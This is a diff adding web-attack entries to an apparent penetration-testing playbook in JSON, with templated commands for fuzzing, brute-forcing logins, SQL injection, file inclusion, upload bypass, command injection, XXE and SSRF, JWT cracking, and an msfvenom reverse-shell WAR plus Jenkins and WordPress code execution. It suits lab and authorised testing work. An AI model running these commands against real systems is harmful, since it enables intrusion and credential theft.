+    { "name": "Directory and file discovery", "phase": "Recon", "service": "http", "applies": "any", "needs": [], "yields": ["web app"], "when": "Any website: brute-force paths to find hidden pages, admin panels, backups and upload folders.", "tools": ["ffuf","gobuster","feroxbuster"] },
+    { "name": "Exposed git repository recovery", "phase": "Recon", "service": "http", "applies": "any", "needs": ["web app"], "yields": ["creds"], "when": "A /.git/ path answers on the site: download the repository and read its history for source, secrets and old passwords.", "tools": [], "commands": [
+      { "purpose": "Check for an exposed repo (a 'ref:' line means it is there)", "template": "curl -s http://{{DNS}}/.git/HEAD", "intent": "discover" },
+      { "purpose": "Download the .git folder and rebuild the source", "template": "git-dumper http://{{DNS}}/.git/ ./repo", "intent": "dump" },
+      { "purpose": "Commit history: deleted secrets live in old commits", "template": "git -C repo log --oneline --all", "intent": "enumerate" },
+      { "purpose": "Show one commit's changes", "template": "git -C repo show <commit>", "intent": "dump" }
+    ] },
+    {
+      "name": "Virtual host and subdomain discovery",
+      "phase": "Recon", "service": "http", "applies": "any",
+      "needs": [], "yields": ["web app"],
+      "when": "The site answers on a hostname: other hostnames on the same IP may serve different, weaker apps.",
+      "tools": ["ffuf", "gobuster"],
+      "commands": [
+        { "purpose": "Check the size of a bogus vhost to pick an -fs filter", "template": "curl -s -H 'Host: doesnotexist.{{DNS}}' http://{{TARGET}}/ | wc -c", "intent": "tune" },
+        { "purpose": "Vhost fuzz filtering that size; add each hit to /etc/hosts", "template": "ffuf -u http://{{TARGET}} -H 'Host: FUZZ.{{DNS}}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <size>", "intent": "discover" }
+      ]
+    },
+    {
+      "name": "Parameter discovery",
+      "phase": "Recon", "service": "http", "applies": "any",
+      "needs": ["web app"], "yields": [],
+      "when": "A page looks like it should take input but shows no form: find hidden GET or POST parameters.",
+      "tools": ["arjun"],
+      "commands": [
+        { "purpose": "Fuzz GET parameter names", "template": "ffuf -u 'http://{{DNS}}/<page>?FUZZ=1' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <size>", "intent": "discover" },
+        { "purpose": "Fuzz POST parameter names", "template": "ffuf -u http://{{DNS}}/<page> -X POST -d 'FUZZ=1' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <size>", "intent": "discover" }
+      ]
+    },
+    {
+      "name": "CMS scanning",
+      "phase": "Recon", "service": "http", "applies": "any",
+      "needs": ["web app"], "yields": ["version", "creds"],
+      "when": "Fingerprinting shows WordPress, Drupal or Joomla: list its version, plugins, themes and users.",
+      "tools": ["wpscan", "droopescan", "joomscan"],
+      "commands": [
+        { "purpose": "WordPress version from the generator tag", "template": "curl -s http://{{DNS}}/ | grep -i 'generator'", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "Web server vulnerability scan",
+      "phase": "Recon", "service": "http", "applies": "any",
+      "needs": [], "yields": ["version"],
+      "when": "You want a quick list of misconfigurations, old software and interesting default files on a web server.",
+      "tools": ["nikto", "nuclei"],
+      "commands": []
+    },
+    {
+      "name": "API discovery",
+      "phase": "Recon", "service": "http", "applies": "any",
+      "needs": ["web app"], "yields": [],
+      "when": "The site uses JSON or has /api paths: find the endpoint list and its documentation.",
+      "tools": ["ffuf"],
+      "commands": [
+        { "purpose": "Fuzz API endpoint names", "template": "ffuf -u http://{{DNS}}/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -ac", "intent": "discover" },
+        { "purpose": "Look for OpenAPI / Swagger docs", "template": "for p in swagger.json openapi.json api-docs swagger/index.html api/swagger.json v2/api-docs; do echo \"$p $(curl -s -o /dev/null -w '%{http_code}' http://{{DNS}}/$p)\"; done", "intent": "discover" },
+        { "purpose": "Ask which HTTP methods an endpoint allows", "template": "curl -si -X OPTIONS http://{{DNS}}/api/<endpoint>", "intent": "enumerate" },
+        { "purpose": "GraphQL introspection: list the schema's types", "template": "curl -s -X POST -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}' http://{{DNS}}/graphql", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "Source and JavaScript review",
+      "phase": "Recon", "service": "http", "applies": "any",
+      "needs": ["web app"], "yields": ["creds", "version"],
+      "when": "On every page you find: read the HTML and JS for comments, hidden paths, API keys, versions and credentials.",
+      "tools": ["curl"],
+      "commands": [
+        { "purpose": "HTML comments on a page", "template": "curl -s http://{{DNS}}/<page> | grep -oE '<!--.*?-->'", "intent": "enumerate" },
+        { "purpose": "List the scripts a page loads", "template": "curl -s http://{{DNS}}/ | grep -oE 'src=\"[^\"]+\\.js[^\"]*\"'", "intent": "enumerate" },
+        { "purpose": "Pull paths and endpoints out of a JS file", "template": "curl -s http://{{DNS}}/<file>.js | grep -oE '[\"'\\''](/[a-zA-Z0-9_./-]+)[\"'\\'']' | sort -u", "intent": "discover" },
+        { "purpose": "Grep a JS file for secrets", "template": "curl -s http://{{DNS}}/<file>.js | grep -iE 'api[_-]?key|token|secret|passw|admin'", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "Default and weak credentials",
+      "phase": "Initial Access", "service": "http", "applies": "any",
+      "needs": ["web app"], "yields": ["creds", "admin"],
+      "when": "You find a login page for a named product: try the vendor's documented default login and obvious pairs like admin/admin first.",
+      "tools": ["nuclei"],
+      "commands": [
+        { "purpose": "Look up a product's default logins offline", "template": "grep -ri '<product>' /usr/share/seclists/Passwords/Default-Credentials/", "intent": "authenticate" }
+      ]
+    },
+    { "name": "Brute-force a web login", "phase": "Initial Access", "service": "http", "applies": "any", "needs": ["web app"], "yields": ["creds"], "when": "You know or suspect a valid username and the login has no lockout: guess passwords with a wordlist.", "tools": ["hydra"], "commands": [
+      { "purpose": "Same attack with ffuf; -fr hides responses containing the failure text", "template": "ffuf -u http://{{DNS}}/<page> -X POST -d 'username=<user>&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/wordlists/rockyou.txt -fr 'Invalid'", "intent": "authenticate" }
+    ] },
+    {
+      "name": "SQL injection",
+      "phase": "Initial Access", "service": "http", "applies": "any",
+      "needs": ["web app"], "yields": ["creds", "hash", "admin"],
+      "when": "A parameter, search box or login talks to a database: check whether your input breaks or changes the query.",
+      "tools": ["sqlmap"],
+      "commands": [
+        { "purpose": "Single quote probe: a SQL error or a changed page is a strong hint", "template": "curl -s \"http://{{DNS}}/<page>?id=1'\"", "intent": "discover" },
+        { "purpose": "Boolean probe: compare page sizes for true vs false", "template": "curl -s 'http://{{DNS}}/<page>?id=1%20AND%201=1' | wc -c; curl -s 'http://{{DNS}}/<page>?id=1%20AND%201=2' | wc -c", "intent": "discover" },
+        { "purpose": "Login bypass probe in the username field", "template": "curl -s -X POST http://{{DNS}}/<page> -d \"username=admin'-- -&password=x\"", "intent": "exploit" }
+      ]
+    },
+    {
+      "name": "Local file inclusion and path traversal",
+      "phase": "Initial Access", "service": "http", "applies": "any",
+      "needs": ["web app"], "yields": ["creds"],
+      "when": "A parameter looks like a file or page name (?page=, ?file=, ?lang=): try to read files outside the web folder.",
+      "tools": ["ffuf"],
+      "commands": [
+        { "purpose": "Classic traversal to a Linux file", "template": "curl -s 'http://{{DNS}}/<page>?file=../../../../../../etc/passwd'", "intent": "discover" },
+        { "purpose": "Bypass a filter that strips ../ once", "template": "curl -s 'http://{{DNS}}/<page>?file=....//....//....//....//etc/passwd'", "intent": "discover" },
+        { "purpose": "Windows target file", "template": "curl -s 'http://{{DNS}}/<page>?file=..\\..\\..\\..\\windows\\win.ini'", "intent": "discover" },
+        { "purpose": "Read PHP source as base64 with the filter wrapper", "template": "curl -s 'http://{{DNS}}/<page>?file=php://filter/convert.base64-encode/resource=index.php' | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d", "intent": "dump" },
+        { "purpose": "Fuzz many traversal payloads; filter the normal page size", "template": "ffuf -u 'http://{{DNS}}/<page>?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs <size>", "intent": "discover" },
+        { "purpose": "If the web log is readable, log poisoning may turn LFI into code execution", "template": "curl -s 'http://{{DNS}}/<page>?file=../../../../../../var/log/apache2/access.log'", "intent": "discover" }
+      ]
+    },
+    {
+      "name": "File upload bypass",
+      "phase": "Initial Access", "service": "http", "applies": "any",
+      "needs": ["web app"], "yields": ["shell"],
+      "when": "The site lets you upload files: find which file name, type or content check you can get past, and where the file ends up.",
+      "tools": ["curl"],
+      "commands": [
+        { "purpose": "Alternative PHP extension (also try .php5, .phar, .pHp)", "template": "curl -s -F 'file=@<file>;filename=test.phtml' http://{{DNS}}/<upload_page>", "intent": "exploit" },
+        { "purpose": "Spoof the Content-Type to an image", "template": "curl -s -F 'file=@<file>;filename=test.php;type=image/png' http://{{DNS}}/<upload_page>", "intent": "exploit" },
+        { "purpose": "Double extension to pass an extension check", "template": "curl -s -F 'file=@<file>;filename=test.jpg.php' http://{{DNS}}/<upload_page>", "intent": "exploit" },
+        { "purpose": "Prepend GIF magic bytes to pass a content check", "template": "(printf 'GIF89a\\n'; cat <file>) > test.gif.php", "intent": "tune" },
+        { "purpose": "Find the upload folder", "template": "ffuf -u http://{{DNS}}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,403 | grep -iE 'upload|file|image|media'", "intent": "discover" }
+      ]
+    },
+    {
+      "name": "Command injection",
+      "phase": "Initial Access", "service": "http", "applies": "any",
+      "needs": ["web app"], "yields": ["shell"],
+      "when": "A feature runs a system tool for you (ping, lookup, convert): check whether extra shell commands get through.",
+      "tools": ["commix"],
+      "commands": [
+        { "purpose": "Separator probes; output of id means it worked (try ; | && $() and %0a)", "template": "curl -s -X POST http://{{DNS}}/<page> --data-urlencode 'ip=127.0.0.1;id'", "intent": "discover" },
+        { "purpose": "Blind probe: a 5 second delay means injection", "template": "time curl -s -X POST http://{{DNS}}/<page> --data-urlencode 'ip=127.0.0.1;sleep 5'", "intent": "discover" },
+        { "purpose": "Blind probe: watch for pings from the target", "template": "sudo tcpdump -ni tun0 icmp", "intent": "discover" },
+        { "purpose": "Fuzz many injection payloads", "template": "ffuf -u http://{{DNS}}/<page> -X POST -d 'ip=127.0.0.1FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/seclists/Fuzzing/command-injection-commix.txt -fs <size>", "intent": "discover" }
+      ]
+    },
+    {
+      "name": "Server-side template injection",
+      "phase": "Initial Access", "service": "http", "applies": "any",
+      "needs": ["web app"], "yields": ["shell"],
+      "when": "Your input is echoed back on the page (a name, a message, an email preview): check whether the server evaluates it as a template.",
+      "tools": ["sstimap"],
+      "commands": [
+        { "purpose": "Polyglot probe: an error or missing text hints at a template engine", "template": "curl -s -G http://{{DNS}}/<page> --data-urlencode \"name=\\${{<%[%'\\\"}}%\\\\.\"","intent": "discover" },
+        { "purpose": "Math probe; 49 in the reply means it evaluated (also try ${7*7} and <%= 7*7 %>)", "template": "curl -s -G http://{{DNS}}/<page> --data-urlencode 'name={{7*7}}'", "intent": "discover" },
+        { "purpose": "Tell engines apart: 7777777 is Jinja2, 49 is Twig", "template": "curl -s -G http://{{DNS}}/<page> --data-urlencode \"name={{7*'7'}}\"", "intent": "discover" }
+      ]
+    },
+    {
+      "name": "XML external entity injection",
+      "phase": "Initial Access", "service": "http", "applies": "any",
+      "needs": ["web app"], "yields": ["creds"],
+      "when": "The app accepts XML (uploads, SOAP, SVG, or JSON you can switch to XML): check whether it resolves external entities.",
+      "tools": [],
+      "commands": [
+        { "purpose": "Read a local file through an entity", "template": "curl -s -X POST http://{{DNS}}/<page> -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>'", "intent": "discover" },
+        { "purpose": "Blind check: serve files and watch for a hit from the target", "template": "python3 -m http.server {{LPORT}}", "intent": "discover" },
+        { "purpose": "Blind probe that calls back to your web server", "template": "curl -s -X POST http://{{DNS}}/<page> -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://{{LHOST}}:{{LPORT}}/xxe\">]><r>&x;</r>'", "intent": "discover" }
+      ]
+    },
+    {
+      "name": "Insecure direct object reference",
+      "phase": "Initial Access", "service": "http", "applies": "any",
+      "needs": ["web app"], "yields": ["creds", "admin"],
+      "when": "URLs or API calls carry IDs (?id=12, /users/12, invoice numbers): check whether changing them shows other users' data.",
+      "tools": ["curl"],
+      "commands": [
+        { "purpose": "Request another user's object with your own session", "template": "curl -s -b 'session=<cookie>' http://{{DNS}}/api/users/<id>", "intent": "discover" },
+        { "purpose": "Make a list of numeric IDs", "template": "seq 0 1000 > ids.txt", "intent": "tune" },
+        { "purpose": "Fuzz IDs with your session; filter the 'not found' size", "template": "ffuf -u 'http://{{DNS}}/<page>?id=FUZZ' -w ids.txt -b 'session=<cookie>' -fs <size>", "intent": "discover" }
+      ]
+    },
+    { "name": "Server-side request forgery", "phase": "Initial Access", "service": "http", "applies": "any", "needs": ["web app"], "yields": ["web app","creds"], "when": "A feature fetches a URL you give it (link preview, import, webhook, PDF render): make the server request internal addresses for you.", "tools": ["ffuf"], "commands": [
+      { "purpose": "Confirm it calls out: run python3 -m http.server {{LPORT}} and watch for the hit", "template": "curl -s -X POST http://{{DNS}}/<page> --data-urlencode 'url=http://{{LHOST}}:{{LPORT}}/ssrf'", "intent": "discover" },
+      { "purpose": "Read a service that only listens on the server itself", "template": "curl -s -X POST http://{{DNS}}/<page> --data-urlencode 'url=http://127.0.0.1:<port>/'", "intent": "enumerate" },
+      { "purpose": "Make a port list for an internal scan", "template": "seq 1 65535 > ports.txt", "intent": "tune" },
+      { "purpose": "Scan internal ports through it; filter the closed-port size", "template": "ffuf -u http://{{DNS}}/<page> -X POST -d 'url=http://127.0.0.1:FUZZ/' -H 'Content-Type: application/x-www-form-urlencoded' -w ports.txt -fs <size>", "intent": "discover" }
+    ] },
+    { "name": "JSON Web Token tampering", "phase": "Initial Access", "service": "http", "applies": "any", "needs": ["web app"], "yields": ["admin"], "when": "A cookie or Authorization header holds three dot-separated base64 parts starting eyJ: read the claims, then try a weak secret or alg=none.", "tools": ["jwt_tool"], "commands": [
+      { "purpose": "Decode the header and payload without any tool", "template": "python3 -c \"import sys,base64;[print(base64.urlsafe_b64decode(p+'='*(-len(p)%4))) for p in sys.argv[1].split('.')[:2]]\" '<token>'", "intent": "enumerate" },
+      { "purpose": "Crack a weak HS256 signing secret (token saved in a file)", "template": "hashcat -m 16500 <file> /usr/share/wordlists/rockyou.txt", "intent": "exploit" }
+    ] },
+    {
+      "name": "Known vulnerability lookup",
+      "phase": "Initial Access", "service": "any", "applies": "any",
+      "needs": ["version"], "yields": ["shell"],
+      "when": "You know a product name and version: search for public CVEs and exploits before trying anything custom.",
+      "tools": ["searchsploit", "nuclei"],
+      "commands": [
+        { "purpose": "Vulnerability scripts against the found ports", "template": "nmap --script vuln -sV -p <ports> {{TARGET}}", "intent": "enumerate" }
+      ]
+    },
+    { "name": "Tomcat manager code execution", "phase": "Initial Access", "service": "http", "applies": "any", "needs": ["creds"], "yields": ["shell"], "when": "Tomcat answers on /manager and you have or guess manager credentials: deploy a WAR file that calls back to you.", "tools": ["msfvenom","curl"], "commands": [
+      { "purpose": "Test a manager login (the text API needs the manager-script role; else use /manager/html)", "template": "curl -s -u '<user>:<pass>' http://{{DNS}}:8080/manager/text/list", "intent": "authenticate" },
+      { "purpose": "Build a JSP reverse-shell WAR", "template": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f war -o <file>.war", "intent": "exploit" },
+      { "purpose": "Deploy it under a path of your choice", "template": "curl -s -u '<user>:<pass>' -T <file>.war 'http://{{DNS}}:8080/manager/text/deploy?path=/<app>'", "intent": "exploit" },
+      { "purpose": "Start your listener, then trigger the app", "template": "curl -s http://{{DNS}}:8080/<app>/", "intent": "exploit" }
+    ] },
+    { "name": "Jenkins script console code execution", "phase": "Initial Access", "service": "http", "applies": "any", "needs": ["web app"], "yields": ["shell","creds"], "when": "You can open Jenkins' /script page (no login, or an admin login): it runs Groovy as the Jenkins service account.", "tools": [], "commands": [
+      { "purpose": "Jenkins version from the response headers", "template": "curl -sI http://{{DNS}}:8080/ | grep -i x-jenkins", "intent": "enumerate" },
+      { "purpose": "Is the script console reachable? (200 means yes)", "template": "curl -s -o /dev/null -w '%{http_code}\\n' http://{{DNS}}:8080/script", "intent": "discover" },
+      { "purpose": "In the console: run an OS command (on Windows: 'cmd /c whoami')", "template": "println \"id\".execute().text", "intent": "exploit" },
+      { "purpose": "In the console: decrypt a secret copied from credentials.xml", "template": "println hudson.util.Secret.decrypt(\"<secret>\")", "intent": "dump" }
+    ] },
+    { "name": "WordPress admin code execution", "phase": "Initial Access", "service": "http", "applies": "any", "needs": ["creds"], "yields": ["shell"], "when": "You have a WordPress administrator login: put PHP into a theme file or upload it as a plugin, then request it.", "tools": ["wpscan","curl"], "commands": [
+      { "purpose": "Theme route: paste your PHP into 404.php of a theme in Appearance > Theme File Editor, then request it", "template": "curl -s http://{{DNS}}/wp-content/themes/<theme>/404.php", "intent": "exploit" },
+      { "purpose": "Plugin route: zip your PHP file, then upload it in Plugins > Add New > Upload", "template": "zip <plugin>.zip <file>.php", "intent": "tune" },
+      { "purpose": "Request the uploaded plugin file (it is unpacked even if WordPress calls the plugin invalid)", "template": "curl -s http://{{DNS}}/wp-content/plugins/<plugin>/<file>.php", "intent": "exploit" }
+    ] },
+    {
+      "name": "Web shell command execution",
+      "phase": "Initial Access", "service": "http", "applies": "any",
+      "needs": ["web app"], "yields": ["shell"],
+      "when": "You managed to upload or write a web shell: run commands through it, then upgrade to a reverse shell from the Reverse shells page.",
+      "tools": ["curl"],
+      "commands": [
+        { "purpose": "Kali's bundled web shells, ready to upload", "template": "ls /usr/share/webshells/", "intent": "transfer" },
+        { "purpose": "Run a command through the uploaded shell", "template": "curl -s -G http://{{DNS}}/<upload_dir>/<file> --data-urlencode 'cmd=id'", "intent": "exploit" },
+        { "purpose": "See which tools exist on the target for a reverse shell", "template": "curl -s -G http://{{DNS}}/<upload_dir>/<file> --data-urlencode 'cmd=which python3 python bash nc curl wget'", "intent": "enumerate" },
+        { "purpose": "Start your listener before triggering a reverse shell", "template": "nc -lvnp {{LPORT}}", "intent": "" }
+      ]
+    }
+  ]
+}
